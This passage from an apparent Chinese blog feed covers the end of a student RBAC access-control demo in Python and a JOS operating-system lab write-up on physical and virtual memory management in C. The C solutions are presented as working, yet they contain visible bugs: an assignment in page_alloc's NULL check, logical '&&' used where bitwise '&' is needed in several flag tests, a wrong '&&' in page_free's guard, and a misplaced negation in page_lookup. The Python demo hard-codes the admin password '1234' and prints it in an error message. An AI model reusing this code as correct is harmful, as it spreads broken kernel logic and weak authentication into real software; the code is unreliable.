class="hljs-string">'select *from role_permission'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> role_id == row[<span class="hljs-number">1</span>]:                permission_list.append(row[<span class="hljs-number">2</span>])        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> permission_list:            print(<span class="hljs-string">'username对应的权限查询失败'</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():role_permission查询失败,请检查code"</span>)    <span class="hljs-comment">#最后查询对应的权限的id</span>    <span class="hljs-keyword">try</span>:        sql=<span class="hljs-string">'select *from permission'</span>        cur.execute(sql)        <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> cur:            <span class="hljs-keyword">if</span> permission == row[<span class="hljs-number">1</span>]:                permission_id = row[<span class="hljs-number">2</span>]        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> permission_id:            print(<span class="hljs-string">"permission对应的permission_id查询失败"</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():role_id查询失败,请检查code"</span>)    <span class="hljs-comment">#看输入的权限与查询出来的是否对应</span>    <span class="hljs-keyword">try</span>:        result2 = <span class="hljs-literal">False</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> permission_list:            <span class="hljs-keyword">if</span> i == permission_id:                result2 = <span class="hljs-literal">True</span>                print(<span class="hljs-string">"有此权限"</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result2:            print(<span class="hljs-string">"没有此权限"</span>)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        print(e)        con.rollback()        print(<span class="hljs-string">"check():权限不匹配，请检查code"</span>)    <span class="hljs-keyword">finally</span>:        cur.close()        con.close()<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:    creat_table()    user_manage = usermanager()    role_manage = rolemanager()    permission_manage = permissionmanager()    user_manage.set_user_table()    role_manage.set_role_table()    permission_manage.set_permission_table()    user_manage.set_user_role_table()    role_manage.set_role_permission_table()    user_list()    user_manage.user_name_show()    role_manage.role_show()    permission_manage.permission_show()    permit = int(input(<span class="hljs-string">"#####请输入你的身份:1.非管理员 2.管理员:#####"</span>))    <span class="hljs-keyword">if</span> permit == <span class="hljs-number">2</span>:        password = input(<span class="hljs-string">"###请输入管理员账户密码:###"</span>)        <span class="hljs-keyword">if</span> password == <span class="hljs-string">'1234'</span>:            print(<span class="hljs-string">"1:显示当前信息   2:查询用户对应权限  3:添加用户  4:角色权限修改  5:退出"</span>)            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:                option = int(input(<span class="hljs-string">"请输入要进行的操作对应的数字"</span>))                <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:                    user_manage.user_name_show()                    role_manage.role_show()                    permission_manage.permission_show()                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:                    username = input(<span class="hljs-string">"请输入要查询的用户名:"</span>)                    user_permission = input(<span class="hljs-string">"请输入要查询该用户的权限(新建/读取/执行/更改/删除):"</span>)                    check(username,user_permission)                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:                    user_manage.add_user()                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">4</span>:                    role_manage.modify_permission()                <span class="hljs-keyword">elif</span> option == <span class="hljs-number">5</span>:                    <span class="hljs-keyword">break</span>                <span class="hljs-keyword">else</span>:                    print(<span class="hljs-string">"输入指令错误，请按照上面显示内容输入"</span>)        <span class="hljs-keyword">else</span>:            print(<span class="hljs-string">"密码错误,在运行中为方便使用,密码为1234"</span>)        <span class="hljs-keyword">if</span> permit == <span class="hljs-number">1</span>:        print(<span class="hljs-string">'1:展示当前信息  2:查询用户权限  3:退出'</span>)        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:            option = int(input(<span class="hljs-string">"请输入要进行的操作对应的数字"</span>))            <span class="hljs-keyword">if</span> option == <span class="hljs-number">1</span>:                user_manage.user_name_show()                role_manage.role_show()                permission_manage.permission_show()            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">2</span>:                username = input(<span class="hljs-string">"请输入要查询的用户名:"</span>)                user_permission = input(<span class="hljs-string">"请输入要查询该用户的权限(新建/读取/执行/更改/删除):"</span>)                check(username,user_permission)            <span class="hljs-keyword">elif</span> option == <span class="hljs-number">3</span>:                <span class="hljs-keyword">break</span>            <span class="hljs-keyword">else</span>:                print(<span class="hljs-string">"输入指令错误，请按照上面显示内容输入"</span>)    <span class="hljs-keyword">else</span>:        print(<span class="hljs-string">"输入指令错误，请按照上面显示内容输入"</span>)</code></pre><h3 id="成果演示"><a href="#成果演示" class="headerlink" title="成果演示"></a>成果演示</h3><ol><li><p>运行对应的mian.py文件，可以看到如下内容</p><p> <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/4-1.PNG" srcset="/img/loading.gif" alt="4-1"></p></li><li><p>当为非管理员的时候，输入1，可以看到之后的可进行的操作，部分演示，在这里通过查询对应员工是否有权限可以来作为访问和访问拒绝的标志，有此权限说明对应用户可以进行访问，没有此权限则访问拒绝</p><p> <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/4-2.PNG" srcset="/img/loading.gif" alt="4-2"></p></li><li><p>之后当为管理员的时候，以添加用户为例子来看对应的运行结果</p><p> <img src="/2020/11/27/RBAC%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6/4-3.PNG" srcset="/img/loading.gif" alt="4-3"></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;RBAC访问控制实验&quot;&gt;&lt;a href=&quot;#RBAC访问控制实验&quot; class=&quot;headerlink&quot; title=&quot;RBAC访问控制实验&quot;&gt;&lt;/a&gt;RBAC访问控制实验&lt;/h1&gt;&lt;h2 id=&quot;RBAC简介&quot;&gt;&lt;a href=&quot;#RBAC简介&quot; class=&quot;</summary>
      
    
    
    
    
    <category term="Information System Security" scheme="http://yoursite.com/tags/Information-System-Security/"/>
    
  </entry>
  
  <entry>
    <title>oslab-2 Memory Management</title>
    <link href="http://yoursite.com/2020/11/21/oslab-2-Memory-Management/"/>
    <id>http://yoursite.com/2020/11/21/oslab-2-Memory-Management/</id>
    <published>2020-11-21T07:32:35.000Z</published>
    <updated>2020-11-23T14:49:00.336Z</updated>
    
    <content type="html"><![CDATA[<h1 id="lab-4：内存管理"><a href="#lab-4：内存管理" class="headerlink" title="lab 4：内存管理"></a>lab 4：内存管理</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>在本实验中，我们将编写操作系统的内存管理代码。 内存管理有两个组成部分。</p><p>第一个部分是内核的<strong>物理内存分配器</strong>，以致于内核可以分配和释放内存。 分配器将以4096字节为操作单位，称为一个页面。 我们的任务是维护一个数据结构，去记录哪些物理页面是空闲的，哪些是已分配的，以及共享每个已分配页面的进程数。 我们还要编写例程来分配和释放内存页面。</p><p>内存管理的第二个组件是<strong>虚拟内存</strong>，它将内核和用户软件使用的虚拟地址映射到物理内存中的地址。 当指令使用内存时，x86硬件的<code>内存管理单元（MMU）</code>执行映射，查询一组页表。 我们根据任务提供的规范修改JOS以设置MMU的页面表。</p><h2 id="Part-Ⅰ：Physical-Page-Management"><a href="#Part-Ⅰ：Physical-Page-Management" class="headerlink" title="Part Ⅰ：Physical Page Management"></a>Part Ⅰ：Physical Page Management</h2><p><code>物理内存页管理</code></p><p>操作系统必须跟踪物理RAM（Random Access Memory,一般是主存）的哪些部分是空闲的，哪些部分正在使用，而这部分的实现是通过物理页面分配器来进行的，它通过struct PageInfo的链表来查询，每个PageInfo对应着一个物理内存页面</p><h3 id="Exercise-1"><a href="#Exercise-1" class="headerlink" title="Exercise 1"></a>Exercise 1</h3><h4 id="boot-alloc-函数"><a href="#boot-alloc-函数" class="headerlink" title="boot_alloc()函数"></a>boot_alloc()函数</h4><p>该函数维护一个static的指针nextfree，初始值是end，end是定义在/kern/kernel.ld中定义的符号，位于bss段的末尾。也就是说从内核的末尾开始分配物理内存。需要添加如下代码</p><pre><code class="hljs c"><span class="hljs-comment">// Allocate a chunk large enough to hold 'n' bytes, then update</span><span class="hljs-comment">// nextfree.  Make sure nextfree is kept aligned</span><span class="hljs-comment">// to a multiple of PGSIZE.</span><span class="hljs-comment">//</span><span class="hljs-comment">// LAB 2: Your code here.</span>result = nextfree;nextfree = ROUNDUP((<span class="hljs-keyword">char</span> *)result + n, PGSIZE);cprintf(<span class="hljs-string">"boot memory at %x, next memory allocate at %x\n"</span>,result, nextfree);<span class="hljs-keyword">return</span> result;</code></pre><p>之后来看mem_init()函数</p><h4 id="mem-init-函数"><a href="#mem-init-函数" class="headerlink" title="mem_init()函数"></a>mem_init()函数</h4><p><img src="/2020/11/21/oslab-2-Memory-Management/1-1.PNG" srcset="/img/loading.gif" alt="1-1"></p><p>可以看到是将boot_alloc()返回的result的值（当前的页）给了kern_pgdir，kern_pgdir保存的是内核页目录的物理地址</p><p>之后根据注释完成代码</p><pre><code class="hljs c"><span class="hljs-comment">// Allocate an array of npages 'struct PageInfo's and store it in 'pages'.</span><span class="hljs-comment">// The kernel uses this array to keep track of physical pages: for</span><span class="hljs-comment">// each physical page, there is a corresponding struct PageInfo in this</span><span class="hljs-comment">// array.  'npages' is the number of physical pages in memory.  Use memset</span><span class="hljs-comment">// to initialize all fields of each struct PageInfo to 0.</span><span class="hljs-comment">// Your code goes here:</span>pages = (struct PageInfo *)boot_alloc(<span class="hljs-keyword">sizeof</span>(struct PageInfo) * npages);<span class="hljs-built_in">memset</span>(pages, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(struct PageInfo) * npages);</code></pre><p>这段代码分配足够的空间来保存pages数组，数组的每一项PageInfo对应一个物理页的信息</p><p><img src="/2020/11/21/oslab-2-Memory-Management/1-2.png" srcset="/img/loading.gif" alt="1-2"></p><h4 id="page-init-函数"><a href="#page-init-函数" class="headerlink" title="page_init()函数"></a>page_init()函数</h4><p>这个函数的主要作用是初始化之前分配的pages数组，并且构建一个PageInfo链表，保存空闲的物理页，表头是全局变量page_free_list。</p><pre><code class="hljs c"><span class="hljs-comment">// 1）第一个物理页是IDT所在，需要标识为已用</span><span class="hljs-comment">// 2）[IOPHYSMEM, EXTPHYSMEM)称为IO hole的区域，需要标识为已用。</span><span class="hljs-comment">// 3）EXTPHYSMEM是内核加载的起始位置，终止位置可以由boot_alloc(0)给出（理由是boot_alloc()分配的内存是内核的最尾部），这块区域也要标识</span><span class="hljs-keyword">size_t</span> i;<span class="hljs-keyword">size_t</span> io_hole_start_page = (<span class="hljs-keyword">size_t</span>)IOPHYSMEM / PGSIZE;<span class="hljs-keyword">size_t</span> kernel_end_page = PADDR(boot_alloc(<span class="hljs-number">0</span>)) / PGSIZE;<span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; npages; i++)&#123;<span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>)&#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (i &gt;= io_hole_start_page &amp;&amp; i &lt; kernel_end_page)&#123;pages[i].pp_ref = <span class="hljs-number">1</span>;pages[i].pp_link = <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">else</span>&#123;pages[i].pp_ref = <span class="hljs-number">0</span>;pages[i].pp_link = page_free_list;page_free_list = &amp;pages[i];&#125;&#125;</code></pre><h4 id="page-alloc-函数"><a href="#page-alloc-函数" class="headerlink" title="page_alloc()函数"></a>page_alloc()函数</h4><p>函数具体作用：</p><p>从page_free_list指向的链表中取出一个PageInfo结构，之后根据形参决定是否将对应的内存初始化为0</p><p>具体实现：</p><pre><code class="hljs c"><span class="hljs-comment">// Be sure to set the pp_link field of the allocated page to NULL so</span><span class="hljs-comment">// page_free can check for double-free bugs.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Returns NULL if out of free memory.</span><span class="hljs-comment">//</span><span class="hljs-comment">// Hint: use page2kva and memset</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><span class="hljs-class"><span class="hljs-title">page_alloc</span>(<span class="hljs-title">int</span> <span class="hljs-title">alloc_flags</span>)</span><span class="hljs-class">&#123;</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">ret</span> = <span class="hljs-title">page_free_list</span>;</span><span class="hljs-keyword">if</span> (ret = <span class="hljs-literal">NULL</span>)&#123;cprintf(<span class="hljs-string">"page_alloc:out of free memory now\n"</span>);<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;page_free_list = ret-&gt;pp_link;ret-&gt;pp_link = <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">if</span> (alloc_flags &amp;&amp; ALLOC_ZERO)&#123;<span class="hljs-built_in">memset</span>(page2kva(ret), <span class="hljs-number">0</span>, PGSIZE);&#125;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">return</span> ret;&#125;</code></pre><h4 id="page-free-函数"><a href="#page-free-函数" class="headerlink" title="page_free()函数"></a>page_free()函数</h4><p>这个函数就是将对应的物理页设置为空闲状态并且将对应的PageInfo连接到空闲链表中</p><pre><code class="hljs c"><span class="hljs-comment">//</span><span class="hljs-comment">// Return a page to the free list.</span><span class="hljs-comment">// (This function should only be called when pp-&gt;pp_ref reaches 0.)</span><span class="hljs-comment">//</span><span class="hljs-keyword">void</span>page_free(struct PageInfo *pp)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span><span class="hljs-comment">// pp-&gt;pp_link is not NULL.</span><span class="hljs-keyword">if</span> (pp-&gt;pp_link != <span class="hljs-literal">NULL</span> &amp;&amp; pp-&gt;pp_ref != <span class="hljs-number">0</span>)&#123;panic(<span class="hljs-string">"page_free:pp-&gt;pp_link is not NULL or pp-&gt;pp_ref is nonzero"</span>);&#125;pp-&gt;pp_link = page_free_list;page_free_list = pp;&#125;</code></pre><h3 id="Exercise复盘"><a href="#Exercise复盘" class="headerlink" title="Exercise复盘"></a>Exercise复盘</h3><p>就是进行了对于内存物理页面的管理，将4096个字节分割成为一个页，然后通过数据结构PageInfo来进行管理，存储对应的数组，并且初始化一些和物理页面相关的操作，比如page_alloc和page_free，完成Part Ⅰ之后的内存情况如下</p><p><img src="/2020/11/21/oslab-2-Memory-Management/1-3.png" srcset="/img/loading.gif" alt="1-3"></p><h2 id="Part-Ⅱ：Virtual-Memory"><a href="#Part-Ⅱ：Virtual-Memory" class="headerlink" title="Part Ⅱ：Virtual Memory"></a>Part Ⅱ：Virtual Memory</h2><h3 id="Exercise-4"><a href="#Exercise-4" class="headerlink" title="Exercise 4"></a>Exercise 4</h3><p><img src="/2020/11/21/oslab-2-Memory-Management/2-1.png" srcset="/img/loading.gif" alt="2-1"></p><h4 id="pagedir-walk-函数"><a href="#pagedir-walk-函数" class="headerlink" title="pagedir_walk()函数"></a>pagedir_walk()函数</h4><p>这个函数是给定pdir参数，来指向一个页目录，返回指针指向虚拟地址va对应的页表条目</p><pre><code class="hljs c"><span class="hljs-keyword">pte_t</span> *pgdir_walk(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">int</span> create)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">pde_t</span> *pde_ptr = pgdir + PDX(va);<span class="hljs-keyword">if</span> (!(*pde_ptr &amp;&amp; PTE_P))&#123;<span class="hljs-keyword">if</span> (create)&#123;<span class="hljs-comment">//分配一个页来作为页表</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span> = <span class="hljs-title">page_alloc</span>(1);</span><span class="hljs-keyword">if</span> (pp == <span class="hljs-literal">NULL</span>)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;pp-&gt;pp_ref++;*pde_ptr = (page2pa(pp)) | PTE_P | PTE_U | PTE_W;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;&#125;<span class="hljs-keyword">return</span> (<span class="hljs-keyword">pte_t</span> *)KADDR(PTE_ADDR(*pde_ptr)) + PTX(va);;&#125;</code></pre><h4 id="boot-map-region-函数"><a href="#boot-map-region-函数" class="headerlink" title="boot_map_region()函数"></a>boot_map_region()函数</h4><p>该函数的作用是通过修改pgdir指向的树结构，将va，va+size对应的虚拟地址映射到pa，pa+size对应的物理地址空间</p><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span>boot_map_region(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">uintptr_t</span> va, <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>, <span class="hljs-keyword">physaddr_t</span> pa, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">size_t</span> pgs = <span class="hljs-built_in">size</span> / PGSIZE;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">size</span> % PGSIZE != <span class="hljs-number">0</span> )&#123;pgs++;     <span class="hljs-comment">//计算有多少页</span>&#125;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; pgs; i++)&#123;<span class="hljs-keyword">pte_t</span> *pte = pgdir_walk(pgdir, (<span class="hljs-keyword">void</span> *)va, <span class="hljs-number">1</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>)&#123;panic(<span class="hljs-string">"boot_map_region:out of physical memory"</span>);&#125;*pte = pa | PTE_P | perm;pa = pa + PGSIZE;va = va + PGSIZE;&#125;&#125;</code></pre><h4 id="page-lookup-函数"><a href="#page-lookup-函数" class="headerlink" title="page_lookup()函数"></a>page_lookup()函数</h4><p>查找pgdir指向的树结构，返回va对应的PTE对应的物理地址对应的PageInfo结构</p><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *</span><span class="hljs-class"><span class="hljs-title">page_lookup</span>(<span class="hljs-title">pde_t</span> *<span class="hljs-title">pgdir</span>, <span class="hljs-title">void</span> *<span class="hljs-title">va</span>, <span class="hljs-title">pte_t</span> **<span class="hljs-title">pte_store</span>)</span><span class="hljs-class">&#123;</span><span class="hljs-comment">// Fill this function in</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span>;</span><span class="hljs-keyword">pte_t</span> *pte =  pgdir_walk(pgdir, va, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">if</span> (!(*pte) &amp; PTE_P) &#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;&#125;<span class="hljs-keyword">physaddr_t</span> pa = PTE_ADDR(*pte);<span class="hljs-comment">//va对应的物理</span>pp = pa2page(pa);<span class="hljs-keyword">if</span> (pte_store != <span class="hljs-literal">NULL</span>) &#123;*pte_store = pte;&#125;<span class="hljs-keyword">return</span> pp;&#125;</code></pre><h4 id="page-remove-函数"><a href="#page-remove-函数" class="headerlink" title="page_remove()函数"></a>page_remove()函数</h4><p>修改pgdir对用的树结构，解除映射关系</p><pre><code class="hljs c"><span class="hljs-keyword">void</span>page_remove(<span class="hljs-keyword">pde_t</span> *pgdir, <span class="hljs-keyword">void</span> *va)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">pte_t</span> *pte_store;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">pp</span> = <span class="hljs-title">page_lookup</span>(<span class="hljs-title">pgdir</span>, <span class="hljs-title">va</span>, &amp;<span class="hljs-title">pte_store</span>);</span> <span class="hljs-comment">//获取va对应的PTE的地址以及pp结构</span><span class="hljs-keyword">if</span> (pp == <span class="hljs-literal">NULL</span>) &#123;    <span class="hljs-comment">//va可能还没有映射，什么都不用做</span><span class="hljs-keyword">return</span>;&#125;page_decref(pp);    <span class="hljs-comment">//将pp-&gt;pp_ref减1，如果pp-&gt;pp_ref为0，需要释放该PageInfo结构（将其放入page_free_list链表中）</span>*pte_store = <span class="hljs-number">0</span>;    <span class="hljs-comment">//将PTE清空</span>tlb_invalidate(pgdir, va); <span class="hljs-comment">//失效化TLB缓存</span>&#125;</code></pre><h4 id="page-insert-函数"><a href="#page-insert-函数" class="headerlink" title="page_insert()函数"></a>page_insert()函数</h4><p>修改pgdir对应的树结构，建立va与pp对应的内存物理页之间的链接</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>page_insert(<span class="hljs-keyword">pde_t</span> *pgdir, struct PageInfo *pp, <span class="hljs-keyword">void</span> *va, <span class="hljs-keyword">int</span> perm)&#123;<span class="hljs-comment">// Fill this function in</span><span class="hljs-comment">// Fill this function in</span><span class="hljs-keyword">pte_t</span> *pte = pgdir_walk(pgdir, va, <span class="hljs-number">1</span>);    <span class="hljs-comment">//拿到va对应的PTE地址，如果va对应的页表还没有分配，则分配一个物理页作为页表</span><span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-keyword">return</span> -E_NO_MEM;&#125;pp-&gt;pp_ref++;<span class="hljs-keyword">if</span> ((*pte) &amp; PTE_P) &#123;<span class="hljs-comment">//当前虚拟地址va已经被映射过，需要先释放</span>page_remove(pgdir, va); &#125;<span class="hljs-keyword">physaddr_t</span> pa = page2pa(pp); <span class="hljs-comment">//将PageInfo结构转换为对应物理页的首地址</span>*pte = pa | perm | PTE_P;    <span class="hljs-comment">//修改PTE</span>pgdir[PDX(va)] |= perm;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><h3 id="Exercise-4复盘"><a href="#Exercise-4复盘" class="headerlink" title="Exercise 4复盘"></a>Exercise 4复盘</h3><p>实现的是对于虚拟内存和物理页面之间的建立联系/树结构的过程，并且实现了一些相关操作</p><h2 id="Part-Ⅲ：kernel-address-space"><a href="#Part-Ⅲ：kernel-address-space" class="headerlink" title="Part Ⅲ：kernel address space"></a>Part Ⅲ：kernel address space</h2><h3 id="Exercise-5"><a href="#Exercise-5" class="headerlink" title="Exercise 5"></a>Exercise 5</h3><pre><code class="hljs c"><span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><span class="hljs-comment">// Map 'pages' read-only by the user at linear address UPAGES</span><span class="hljs-comment">// Permissions:</span><span class="hljs-comment">//    - the new image at UPAGES -- kernel R, user R</span><span class="hljs-comment">//      (ie. perm = PTE_U | PTE_P)</span><span class="hljs-comment">//    - pages itself -- kernel RW, user NONE</span><span class="hljs-comment">// Your code goes here:</span><span class="hljs-comment">//将虚拟地址的UPAGES映射到物理地址pags起始位置</span>boot_map_region(kern_pgdir, UPAGES, PTSIZE, PADDR(pages), PTE_U);<span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><span class="hljs-comment">// Use the physical memory that 'bootstack' refers to as the kernel</span><span class="hljs-comment">// stack.  The kernel stack grows down from virtual address KSTACKTOP.</span><span class="hljs-comment">// We consider the entire range from [KSTACKTOP-PTSIZE, KSTACKTOP)</span><span class="hljs-comment">// to be the kernel stack, but break this into two pieces:</span><span class="hljs-comment">//     * [KSTACKTOP-KSTKSIZE, KSTACKTOP) -- backed by physical memory</span><span class="hljs-comment">//     * [KSTACKTOP-PTSIZE, KSTACKTOP-KSTKSIZE) -- not backed; so if</span><span class="hljs-comment">//       the kernel overflows its stack, it will fault rather than</span><span class="hljs-comment">//       overwrite memory.  Known as a "guard page".</span><span class="hljs-comment">//     Permissions: kernel RW, user NONE</span><span class="hljs-comment">// Your code goes here:</span>boot_map_region(kern_pgdir, KSTACKTOP-KSTKSIZE, KSTKSIZE, PADDR(bootstack), PTE_W);<span class="hljs-comment">//////////////////////////////////////////////////////////////////////</span><span class="hljs-comment">// Map all of physical memory at KERNBASE.</span><span class="hljs-comment">// Ie.  the VA range [KERNBASE, 2^32) should map to</span><span class="hljs-comment">//      the PA range [0, 2^32 - KERNBASE)</span><span class="hljs-comment">// We might not have 2^32 - KERNBASE bytes of physical memory, but</span><span class="hljs-comment">// we just set up the mapping anyway.</span><span class="hljs-comment">// Permissions: kernel RW, user NONE</span><span class="hljs-comment">// Your code goes here:</span>boot_map_region(kern_pgdir, KERNBASE, <span class="hljs-number">0xffffffff</span> - KERNBASE, <span class="hljs-number">0</span>, PTE_W);</code></pre><p>make grade结果</p><p><img src="/2020/11/21/oslab-2-Memory-Management/2-2.PNG" srcset="/img/loading.gif" alt="2-2"></p><h2 id="展示地址"><a href="#展示地址" class="headerlink" title="展示地址"></a>展示地址</h2><p>首先是需要声明函数并且在command结构里面加入对应的命令</p><p><img src="/2020/11/21/oslab-2-Memory-Management/2-4.PNG" srcset="/img/loading.gif" alt="2-4"></p><p><img src="/2020/11/21/oslab-2-Memory-Management/2-3.PNG" srcset="/img/loading.gif" alt="2-3"></p><p>之后就是对应的hanshudaima</p><pre><code class="hljs c"><span class="hljs-keyword">int</span>mon_showva2pa(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv, struct Trapframe *tf)&#123;<span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span> &amp;&amp; argc != <span class="hljs-number">2</span>)&#123;cprintf(<span class="hljs-string">"mon_showva2pa:Command error!!!"</span>);&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(argc == <span class="hljs-number">3</span>)&#123;<span class="hljs-keyword">char</span> *str;<span class="hljs-keyword">uint32_t</span> start = (<span class="hljs-keyword">uint32_t</span>)strtol(argv[<span class="hljs-number">1</span>], &amp;str, <span class="hljs-number">16</span>);<span class="hljs-keyword">uint32_t</span> <span class="hljs-built_in">end</span> = (<span class="hljs-keyword">uint32_t</span>)strtol(argv[<span class="hljs-number">2</span>], &amp;str, <span class="hljs-number">16</span>);<span class="hljs-keyword">uint16_t</span> ref;<span class="hljs-keyword">uint32_t</span> pa;<span class="hljs-keyword">int</span> u, w;<span class="hljs-keyword">pde_t</span> *pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">po</span>;</span><span class="hljs-keyword">for</span> ( ; start &lt;= <span class="hljs-built_in">end</span>; start += PGSIZE)&#123;po = page_lookup(kern_pgdir, (<span class="hljs-keyword">void</span> *)start, &amp;pte);pte = pgdir_walk(kern_pgdir, (<span class="hljs-keyword">void</span> *)start, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>)&#123;cprintf(<span class="hljs-string">"the va does not have a corresponding physical page"</span>);<span class="hljs-keyword">break</span>;&#125;ref = po-&gt;pp_ref;u = ((* pte&amp;PTE_U) == PTE_U);w = ((* pte &amp; PTE_W) == PTE_W);pa = PTE_ADDR(* pte) | (start &amp; <span class="hljs-number">0xff</span>);cprintf(<span class="hljs-string">"VA = %x, PA = %x, pp_ref = %d, PTE_U = %d, PTE_W = %d\n"</span>,start, pa, ref, u, w);&#125;&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argc == <span class="hljs-number">2</span>)&#123;<span class="hljs-keyword">char</span> *str;<span class="hljs-keyword">uint32_t</span> va = (<span class="hljs-keyword">uint32_t</span>)strtol(argv[<span class="hljs-number">1</span>], &amp;str, <span class="hljs-number">16</span>);<span class="hljs-keyword">uint16_t</span> ref;<span class="hljs-keyword">uint32_t</span> pa;<span class="hljs-keyword">int</span> u, w;<span class="hljs-keyword">pde_t</span> *pte;<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PageInfo</span> *<span class="hljs-title">po</span>;</span>po = page_lookup(kern_pgdir, (<span class="hljs-keyword">void</span> *)va, &amp;pte);pte = pgdir_walk(kern_pgdir, (<span class="hljs-keyword">void</span> *)va, <span class="hljs-number">0</span>);<span class="hljs-keyword">if</span> (pte == <span class="hljs-literal">NULL</span>)&#123;cprintf(<span class="hljs-string">"the va does not have a corresponding physical page"</span>);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;ref = po-&gt;pp_ref;u = ((* pte&amp;PTE_U) == PTE_U);w = ((* pte &amp; PTE_W) == PTE_W);pa = PTE_ADDR(* pte) | (va &amp; <span class="hljs-number">0xff</span>);cprintf(<span class="hljs-string">"VA = %x, PA = %x, pp_ref = %d, PTE_U = %d, PTE_W = %d\n"</span>,va, pa, ref, u, w);&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>运行截图</p><ul><li>范围查询</li></ul><p><img src="/2020/11/21/oslab-2-Memory-Management/2-5.PNG" srcset="/img/loading.gif" alt="2-5"></p><ul><li>单页查询</li></ul><p><img src="/2020/11/21/oslab-2-Memory-Management/2-6.PNG" srcset="/img/loading.gif" alt="2-6"></p><h2 id="问题与回答"><a href="#问题与回答" class="headerlink" title="问题与回答"></a>问题与回答</h2><h3 id="Q1"><a href="#Q1" class="headerlink" title="Q1"></a>Q1</h3><blockquote><p>程序中的地址从什么时候开始都是虚拟地址了，请找到那几行代码。</p></blockquote><h3 id="A1"><a href="#A1" class="headerlink" 